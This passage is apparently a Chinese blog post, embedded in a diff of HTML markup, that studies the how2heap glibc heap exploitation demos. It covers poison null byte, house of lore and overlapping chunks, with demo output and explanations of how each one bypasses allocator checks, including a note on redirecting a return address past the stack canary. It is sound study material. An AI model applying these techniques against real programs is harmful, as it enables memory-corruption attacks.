class="keyword">the</span> size <span class="keyword">of</span> <span class="keyword">the</span> next malloc request rounded <span class="built_in">to</span> <span class="keyword">the</span> internal size used <span class="keyword">by</span> <span class="keyword">the</span> malloc implementation. E.g. <span class="keyword">on</span> <span class="title">x64</span>, <span class="number">0x30-0x38</span> <span class="title">will</span> <span class="title">all</span> <span class="title">be</span> <span class="title">rounded</span> <span class="title">to</span> <span class="number">0x40</span>, <span class="title">so</span> <span class="title">they</span> <span class="title">would</span> <span class="title">work</span> <span class="title">for</span> <span class="title">the</span> <span class="title">malloc</span> <span class="title">parameter</span> <span class="title">at</span> <span class="title">the</span> <span class="title">end</span>. </span><br><span class="line">The chunk.size <span class="keyword">of</span> <span class="keyword">the</span> *next* fake region has <span class="built_in">to</span> be sane. That is &gt; <span class="number">2</span>*SIZE_SZ (&gt; <span class="number">16</span> <span class="keyword">on</span> <span class="title">x64</span>) &amp;&amp; &lt; <span class="title">av</span>-&gt;<span class="title">system_mem</span> (&lt; <span class="number">128kb</span> <span class="title">by</span> <span class="title">default</span> <span class="title">for</span> <span class="title">the</span> <span class="title">main</span> <span class="title">arena</span>) <span class="title">to</span> <span class="title">pass</span> <span class="title">the</span> <span class="title">nextsize</span> <span class="title">integrity</span> <span class="title">checks</span>. <span class="title">No</span> <span class="title">need</span> <span class="title">for</span> <span class="title">fastbin</span> <span class="title">size</span>.</span><br><span class="line">Now we will overwrite our pointer <span class="keyword">with</span> <span class="keyword">the</span> address <span class="keyword">of</span> <span class="keyword">the</span> fake region inside <span class="keyword">the</span> fake <span class="keyword">first</span> chunk, <span class="number">0x7ffd0a5e3328</span>.</span><br><span class="line">... note that <span class="keyword">the</span> memory address <span class="keyword">of</span> <span class="keyword">the</span> *region* associated <span class="keyword">with</span> this chunk must be <span class="number">16</span>-<span class="keyword">byte</span> aligned.</span><br><span class="line">Freeing <span class="keyword">the</span> overwritten pointer.</span><br><span class="line">Now <span class="keyword">the</span> next malloc will <span class="literal">return</span> <span class="keyword">the</span> region <span class="keyword">of</span> our fake chunk <span class="keyword">at</span> <span class="number">0x7ffd0a5e3328</span>, which will be <span class="number">0x7ffd0a5e3330</span>!</span><br><span class="line">malloc(<span class="number">0x30</span>): <span class="number">0x7ffd0a5e3330</span></span><br></pre></td></tr></table></figure>
+
+<p>由于是fastbin大小的chunk，所以PREV_INUSE是被忽略的，IS_MMAPPED跟NON_MAIN_ARENA有影响，设置为0即可</p>
+<p>所以设置chunk的大小为0x40</p>
+<p>下一个chunk的大小应该不用太在意</p>
+<p>之后再free掉&amp;fake_chunks<a href="http://pic.giantbranch.cn/pic/1511510134577.jpg" target="_blank" rel="noopener">2</a>，那么fastbin的freeList上就会存储这&amp;fake_chunks<a href="http://pic.giantbranch.cn/pic/1511510134577.jpg" target="_blank" rel="noopener">2</a>，之后再malloc，就是返回这个&amp;fake_chunks<a href="http://pic.giantbranch.cn/pic/1511510134577.jpg" target="_blank" rel="noopener">2</a>地址了</p>
+<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h1><p>溢出一个空字节</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/learn/how2heap# ./poison_null_byte </span><br><span class="line">Welcome <span class="keyword">to</span> poison <span class="keyword">null</span> byte <span class="number">2.0</span>!</span><br><span class="line">Tested <span class="keyword">in</span> Ubuntu <span class="number">14.04</span> <span class="number">64</span><span class="built_in">bit</span>.</span><br><span class="line">This technique can be used <span class="keyword">when</span> you have an off-by-one into a malloc<span class="symbol">'ed</span> region <span class="keyword">with</span> a <span class="keyword">null</span> byte.</span><br><span class="line">We allocate <span class="number">0</span>x100 bytes <span class="keyword">for</span> <span class="symbol">'a</span>'.</span><br><span class="line">a: <span class="number">0</span>x55884397e420</span><br><span class="line">Since we want <span class="keyword">to</span> overflow <span class="symbol">'a</span>', we need <span class="keyword">to</span> know the <span class="symbol">'real</span>' size <span class="keyword">of</span> <span class="symbol">'a</span>' (it may be more than <span class="number">0</span>x100 because <span class="keyword">of</span> rounding): <span class="number">0</span>x108</span><br><span class="line">b: <span class="number">0</span>x55884397e530</span><br><span class="line">c: <span class="number">0</span>x55884397e740</span><br><span class="line"><span class="keyword">In</span> newer versions <span class="keyword">of</span> glibc we will need <span class="keyword">to</span> have our updated size inside b itself <span class="keyword">to</span> pass the check <span class="symbol">'chunksize</span>(P) != prev_size (next_chunk(P))'</span><br><span class="line">b.size: <span class="number">0</span>x211</span><br><span class="line">b.size <span class="keyword">is</span>: (<span class="number">0</span>x200 + <span class="number">0</span>x10) | prev_in_use</span><br><span class="line">We overflow <span class="symbol">'a</span>' <span class="keyword">with</span> a single <span class="keyword">null</span> byte into the metadata <span class="keyword">of</span> <span class="symbol">'b</span>'</span><br><span class="line">b.size: <span class="number">0</span>x200</span><br><span class="line">c.prev_size <span class="keyword">is</span> <span class="number">0</span>x210</span><br><span class="line">We will pass the check since chunksize(P) == <span class="number">0</span>x200 == <span class="number">0</span>x200 == prev_size (next_chunk(P))</span><br><span class="line">b1: <span class="number">0</span>x55884397e530</span><br><span class="line">Now we malloc <span class="symbol">'b1</span>'. It will be placed where <span class="symbol">'b</span>' was. At this point c.prev_size should have been updated, but it was <span class="keyword">not</span>: <span class="number">210</span></span><br><span class="line">Interestingly, the updated value <span class="keyword">of</span> c.prev_size has been written <span class="number">0</span>x10 bytes before c.prev_size: f0</span><br><span class="line">We malloc <span class="symbol">'b2</span>', our <span class="symbol">'victim</span>' chunk.</span><br><span class="line">b2: <span class="number">0</span>x55884397e640</span><br><span class="line">Current b2 content:</span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">Now we free <span class="symbol">'b1</span>' <span class="keyword">and</span> <span class="symbol">'c</span>': this will consolidate the chunks <span class="symbol">'b1</span>' <span class="keyword">and</span> <span class="symbol">'c</span>' (forgetting about <span class="symbol">'b2</span>').</span><br><span class="line">Finally, we allocate <span class="symbol">'d</span>', overlapping <span class="symbol">'b2</span>'.</span><br><span class="line">d: <span class="number">0</span>x55884397e530</span><br><span class="line">Now <span class="symbol">'d</span>' <span class="keyword">and</span> <span class="symbol">'b2</span>' overlap.</span><br><span class="line"><span class="keyword">New</span> b2 content:</span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">Thanks <span class="keyword">to</span> http://www.contextis.com/documents/<span class="number">120</span>/Glibc_Adventures-The_Forgotten_Chunks.pdf <span class="keyword">for</span> the clear explanation <span class="keyword">of</span> this technique.</span><br></pre></td></tr></table></figure>
+
+<p>首先申请了三个chunk</p>
+<p>a    0x100<br>b    0x200<br>c    0x100</p>
+<p>之后在b+0x1f0偏移处设置0x200，以便绕过检测，使 chunksize(P) == prev_size (next_chunk(P)）</p>
+<p>因为空字节溢出后chunksize(P) 就变为0x200</p>
+<p>那么之后free(b)就可以成功了</p>
+<p>之后申请了两个chunk</p>
+<p>b1  0x100<br>b2    0x80</p>
+<p>这两个都会覆盖原来b的位置，并将b2的内容覆盖为0x80个B，以便之后看到效果</p>
+<p>之后free(b1),这个没什么发生，那么下一步free(c)的时候，由于c的堆结构完全没变化</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511509778609.jpg" alt></p>
+<p>所以他认为前面的chunk是空的，前面的大小是0x210，所以就跟前面0x210大小的合并</p>
+<p>原来chunk b的地方是top chunk了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511509887058.jpg" alt></p>
+<p>那我们再malloc 0x300,就可以获取整个一大片的内存，进而可以任意控制b2的值了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511509947423.jpg" alt></p>
+<p>也就把BBB覆盖为DDDD了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511509978375.jpg" alt></p>
+<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h1><p>欺骗malloc，通过滥用smallbin freelist来返回一个几乎任意的指针。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Lore</span><br><span class="line">This is a revisited version that bypass also the hardening <span class="keyword">check</span> introduced <span class="keyword">by</span> glibc malloc</span><br><span class="line">This <span class="keyword">is</span> tested against Ubuntu <span class="number">14.04</span><span class="number">.4</span> - <span class="number">32</span><span class="built_in">bit</span> - glibc<span class="number">-2.23</span></span><br><span class="line"></span><br><span class="line">Allocating the victim <span class="keyword">chunk</span></span><br><span class="line">Allocated the <span class="keyword">first</span> small <span class="keyword">chunk</span> <span class="keyword">on</span> the <span class="keyword">heap</span> <span class="keyword">at</span> <span class="number">0x556f56d76420</span></span><br><span class="line">stack_buffer_1 <span class="keyword">at</span> <span class="number">0x7fff28d6e1d0</span></span><br><span class="line">stack_buffer_2 <span class="keyword">at</span> <span class="number">0x7fff28d6e1b0</span></span><br><span class="line"><span class="keyword">Create</span> a fake <span class="keyword">chunk</span> <span class="keyword">on</span> the stackSet the fwd pointer <span class="keyword">to</span> the victim_chunk <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> bypass the <span class="keyword">check</span> <span class="keyword">of</span> small <span class="keyword">bin</span> corruptedin <span class="keyword">second</span> <span class="keyword">to</span> the <span class="keyword">last</span> malloc, which putting stack address <span class="keyword">on</span> smallbin <span class="keyword">list</span></span><br><span class="line"><span class="keyword">Set</span> the bk pointer <span class="keyword">to</span> stack_buffer_2 <span class="keyword">and</span> <span class="keyword">set</span> the fwd pointer <span class="keyword">of</span> stack_buffer_2 <span class="keyword">to</span> point <span class="keyword">to</span> stack_buffer_1 <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> bypass the <span class="keyword">check</span> <span class="keyword">of</span> small <span class="keyword">bin</span> corrupted <span class="keyword">in</span> <span class="keyword">last</span> malloc, which <span class="keyword">returning</span> pointer <span class="keyword">to</span> the fake <span class="keyword">chunk</span> <span class="keyword">on</span> stackAllocating another <span class="keyword">large</span> <span class="keyword">chunk</span> <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> avoid consolidating the top <span class="keyword">chunk</span> withthe small one during the free()</span><br><span class="line">Allocated the <span class="keyword">large</span> <span class="keyword">chunk</span> <span class="keyword">on</span> the <span class="keyword">heap</span> <span class="keyword">at</span> <span class="number">0x556f56d76490</span></span><br><span class="line">Freeing the <span class="keyword">chunk</span> <span class="number">0x556f56d76420</span>, it will be inserted <span class="keyword">in</span> the unsorted <span class="keyword">bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> the unsorted <span class="keyword">bin</span> the victim<span class="string">'s fwd and bk pointers are nil</span></span><br><span class="line"><span class="string">victim-&gt;fwd: (nil)</span></span><br><span class="line"><span class="string">victim-&gt;bk: (nil)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now performing a malloc that can'</span>t be handled <span class="keyword">by</span> the UnsortedBin, nor the small <span class="keyword">bin</span></span><br><span class="line">This means that the <span class="keyword">chunk</span> <span class="number">0x556f56d76420</span> will be inserted <span class="keyword">in</span> front <span class="keyword">of</span> the SmallBin</span><br><span class="line">The <span class="keyword">chunk</span> that can<span class="string">'t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x556f56d76880</span></span><br><span class="line"><span class="string">The victim chunk has been sorted and its fwd and bk pointers updated</span></span><br><span class="line"><span class="string">victim-&gt;fwd: 0x7f82610e8bb8</span></span><br><span class="line"><span class="string">victim-&gt;bk: 0x7f82610e8bb8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span></span><br><span class="line"><span class="string">Now allocating a chunk with size equal to the first one freed</span></span><br><span class="line"><span class="string">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span></span><br><span class="line"><span class="string">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span></span><br><span class="line"><span class="string">p4 = malloc(100)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f82610e8bb8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p4 is 0x7fff28d6e1e0 and should be on the stack!</span></span><br></pre></td></tr></table></figure>
+
+<p>先申请一个0x100的chunk</p>
+<p>之后在栈上伪造两个chunk</p>
+<p>stack_buffer_1的fd指向那victim——0x100的chunk，bk指向stack_buffer_2，<br>而stack_buffer_2的fd指向stack_buffer_1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line">  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">  goto errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为这样可以绕过smallbin check</p>
+<p>之后申请一个large chunk避免free的时候合并到top chunk去了</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>之后free掉 victim，就放到unsortbin list去了</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free((<span class="name">void*</span>)victim)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在它的前向指针和后向指针都是null</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511514026627.jpg" alt></p>
+<p>之后申请了一个UnsortedBin和small bin都不能处理的大小</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br></pre></td></tr></table></figure>
+
+<p>查找UnsortedBin的过程中，就把victim放回small bin了</p>
+<p>之后我们改变victim的bk，再申请一个同样是0x100大小的chunk，那么就申请到了victim的位置，当然栈地址就写到了small bin list了，</p>
+<p>最后我们再去申请一个0x100的chunk，返回的地址就在栈上了</p>
+<p>之后作者给了一种利用的思路，就是直接通过返回的这个chunk指针，直接改写返回地址，从而绕过canary</p>
+<h1 id="overlapping-chunks1"><a href="#overlapping-chunks1" class="headerlink" title="overlapping_chunks1"></a>overlapping_chunks1</h1><p>堆块堆叠，就是两个或以上的堆重叠了</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line"><span class="keyword">Let</span><span class="comment">'s start to allocate 3 chunks on the heap</span></span><br><span class="line">The <span class="number">3</span> chunks have been allocated here:</span><br><span class="line">p1=<span class="number">0x558962a08420</span></span><br><span class="line">p2=<span class="number">0x558962a08520</span></span><br><span class="line">p3=<span class="number">0x558962a08620</span></span><br><span class="line"></span><br><span class="line">Now <span class="keyword">let</span><span class="comment">'s free the chunk p2</span></span><br><span class="line">The chunk p2 <span class="keyword">is</span> now <span class="keyword">in</span> the unsorted bin ready <span class="keyword">to</span> serve possible</span><br><span class="line"><span class="keyword">new</span> malloc() <span class="keyword">of</span> its size</span><br><span class="line">Now <span class="keyword">let</span><span class="comment">'s simulate an overflow that can overwrite the size of the</span></span><br><span class="line">chunk freed p2.</span><br><span class="line"><span class="keyword">For</span> a toy program, the value <span class="keyword">of</span> the last <span class="number">3</span> bits <span class="keyword">is</span> unimportant; however, it <span class="keyword">is</span> best <span class="keyword">to</span> maintain the stability <span class="keyword">of</span> the heap.</span><br><span class="line"><span class="keyword">To</span> achieve this stability we will mark the least signifigant bit <span class="keyword">as</span> <span class="number">1</span> (prev_inuse), <span class="keyword">to</span> assure that p1 <span class="keyword">is</span> <span class="keyword">not</span> mistaken <span class="keyword">for</span> a free chunk.</span><br><span class="line">We are going <span class="keyword">to</span> <span class="keyword">set</span> the size <span class="keyword">of</span> chunk p2 <span class="keyword">to</span> <span class="keyword">to</span> <span class="number">385</span>, which gives us</span><br><span class="line">a region size <span class="keyword">of</span> <span class="number">376</span></span><br><span class="line"></span><br><span class="line">Now <span class="keyword">let</span><span class="comment">'s allocate another chunk with a size equal to the data</span></span><br><span class="line">size <span class="keyword">of</span> the chunk p2 injected size</span><br><span class="line">This malloc will be served <span class="keyword">from</span> the previously freed chunk that</span><br><span class="line"><span class="keyword">is</span> parked <span class="keyword">in</span> the unsorted bin which size has been modified <span class="keyword">by</span> us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at <span class="number">0x558962a08520</span> <span class="keyword">and</span> ends at <span class="number">0x558962a090e0</span></span><br><span class="line">p3 starts at <span class="number">0x558962a08620</span> <span class="keyword">and</span> ends at <span class="number">0x558962a088a0</span></span><br><span class="line">p4 should overlap <span class="keyword">with</span> p3, <span class="keyword">in</span> this <span class="keyword">case</span> p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data <span class="keyword">on</span></span><br><span class="line">chunk p3, <span class="keyword">and</span> data written <span class="keyword">to</span> chunk p3 can overwrite data</span><br><span class="line">stored <span class="keyword">in</span> the p4 chunk.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Let</span><span class="comment">'s run through an example. Right now, we have:</span></span><br><span class="line">p4 = XkĄ </span><br><span class="line">p3 = <span class="number">333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333</span>q	 </span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> we memset(p4, <span class="comment">'4', 376), we have:</span></span><br><span class="line">p4 = <span class="number">4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span>q	 </span><br><span class="line">p3 = <span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span>q	 </span><br><span class="line"></span><br><span class="line"><span class="keyword">And</span> <span class="keyword">if</span> we <span class="keyword">then</span> memset(p3, <span class="comment">'3', 80), we have:</span></span><br><span class="line">p4 = <span class="number">4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</span>q	 </span><br><span class="line">p3 = <span class="number">333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</span>q</span><br></pre></td></tr></table></figure>
+
+<p>首先申请了3个chunk，大小分别为0x100-8，0x100-8，0x80-8 内容分别用1，2，3填充</p>
+<p>之后free chunk p2,p2就到了unsorted bin</p>
+<p>那么之后我们伪造p2的size为0x181，这个size刚好就覆盖到p3了</p>
+<p>之后申请了一个0x180-8大小的chunk——p4，那么我们上面伪造的大小就刚好满足要求</p>
+<p>那么这样的p4就可以任意覆盖p3，当然使用p3也可以部分覆盖p4</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511516817177.jpg" alt></p>
+<h1 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">This is a simple chunks overlapping problem</span><br><span class="line">This is also referenced as Nonadjacent Free Chunk Consolidation Attack</span><br><span class="line"></span><br><span class="line">Let's <span class="keyword">start</span> <span class="keyword">to</span> <span class="keyword">allocate</span> <span class="number">5</span> chunks <span class="keyword">on</span> the <span class="keyword">heap</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">chunk</span> p1 <span class="keyword">from</span> <span class="number">0x55c53555f420</span> <span class="keyword">to</span> <span class="number">0x55c53555f808</span></span><br><span class="line"><span class="keyword">chunk</span> p2 <span class="keyword">from</span> <span class="number">0x55c53555f810</span> <span class="keyword">to</span> <span class="number">0x55c53555fbf8</span></span><br><span class="line"><span class="keyword">chunk</span> p3 <span class="keyword">from</span> <span class="number">0x55c53555fc00</span> <span class="keyword">to</span> <span class="number">0x55c53555ffe8</span></span><br><span class="line"><span class="keyword">chunk</span> p4 <span class="keyword">from</span> <span class="number">0x55c53555fff0</span> <span class="keyword">to</span> <span class="number">0x55c5355603d8</span></span><br><span class="line"><span class="keyword">chunk</span> p5 <span class="keyword">from</span> <span class="number">0x55c5355603e0</span> <span class="keyword">to</span> <span class="number">0x55c5355607c8</span></span><br><span class="line"></span><br><span class="line">Let<span class="string">'s free the chunk p4.</span></span><br><span class="line"><span class="string">In this case this isn'</span>t coealesced <span class="keyword">with</span> top <span class="keyword">chunk</span> since we have p5 bordering top <span class="keyword">chunk</span> <span class="keyword">after</span> p4</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span></span><br><span class="line"><span class="string">with the size of chunk_p2 + size of chunk_p3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now during the free() operation on p2, the allocator is fooled to think that </span></span><br><span class="line"><span class="string">the nextchunk is p4 ( since p2 + size_p2 now point to p4 ) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This operation will basically create a big free chunk that wrongly includes p3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now let'</span>s <span class="keyword">allocate</span> a <span class="keyword">new</span> <span class="keyword">chunk</span> <span class="keyword">with</span> a <span class="keyword">size</span> that can be satisfied <span class="keyword">by</span> the previously freed <span class="keyword">chunk</span></span><br><span class="line"></span><br><span class="line">Our malloc() has been satisfied <span class="keyword">by</span> our crafted <span class="keyword">big</span> free <span class="keyword">chunk</span>, <span class="keyword">now</span> p6 <span class="keyword">and</span> p3 <span class="keyword">are</span> overlapping <span class="keyword">and</span> </span><br><span class="line">we can overwrite <span class="keyword">data</span> <span class="keyword">in</span> p3 <span class="keyword">by</span> writing <span class="keyword">on</span> <span class="keyword">chunk</span> p6</span><br><span class="line"></span><br><span class="line"><span class="keyword">chunk</span> p6 <span class="keyword">from</span> <span class="number">0x55c53555f810</span> <span class="keyword">to</span> <span class="number">0x55c53555ffe8</span></span><br><span class="line"><span class="keyword">chunk</span> p3 <span class="keyword">from</span> <span class="number">0x55c53555fc00</span> <span class="keyword">to</span> <span class="number">0x55c53555ffe8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Data</span> inside <span class="keyword">chunk</span> p3: </span><br><span class="line"></span><br><span class="line">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s write something inside p6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Data inside chunk p3: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 